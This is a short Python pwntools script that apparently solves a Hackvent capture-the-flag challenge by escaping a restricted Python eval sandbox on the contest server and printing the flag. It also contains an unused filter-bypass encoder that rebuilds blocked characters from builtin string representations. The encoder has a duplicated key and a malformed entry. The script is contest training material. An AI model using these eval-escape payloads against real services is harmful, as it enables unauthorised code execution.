#!/bin/python2

import pwn

def xor(b, mask):
    o = []
    for i in range(0, len(b)):
        o.append(chr(ord(b[i]) ^ ord(mask[i % len(mask)])))

    return "".join(o)

def preproc(s, lvl=0):
    # acdeinoprstv123790()[]+_"'.
    PP_DICT = {
        "u" : '"+str("1"is"1")[2]+"',
        "l" : '"+str("2"is"1")[2]+"',
        "F" : '"+str("2"is"1")[0]+"',
        "T" : '"+str("1"is"1")[0]+"',
        "b" : '"+str(print)[1]+"',
        "-" : '"+str(print)[6]+"',
        " " : '"+str(print)[9]+"',
        "f" : '"+str(print)[10]+"',
        "<" : '"+str(print)[0]+"',
        ">" : '"+str(print)[24]+"',
        "S" : '"+"s".upp"+"er()+"',
        "A" : '"+"a".upper()+"',
        "N" : '"+"n".upper()+"',
        "T" : '"+"t".upper()+"',
        "4" : '"+str(2+2)+"',
        "5" : '"+str(2+3)+"',
        "6" : '"+str(3+3)+"',
        "8" : '"+str(3+3+2)+"',
    }

    o = []
    for c in s:
        if c in PP_DICT:
            o.append(PP_DICT[c])
        else:
            o.append(c)
    o2 = "".join(o)
    if lvl > 10:
        return "\"" + o2 + "\""
    else:
        return preproc(o2, lvl+1)

# args to SANTA. Will be XOR'd against the flag
args = '\'"+"133713371337133713371337133713371337"+"\''

r = pwn.remote("challenges.hackvent.hacking-lab.com", 1034)
ret = r.recvuntil("a = ")
r.send('eval("\'santa\'."+DENIED[1]+"()")\n')
ret = r.recv(100)
req = 'a+"('+args+')"\n'
r.send(req)
ret = r.recv(100)
r.send('eval(a)\n')
ret = r.recv(100)
r.send('print(a)\n')
ret = r.recv(100)
code = ret[:-9]
print("Flag: %s" % code)
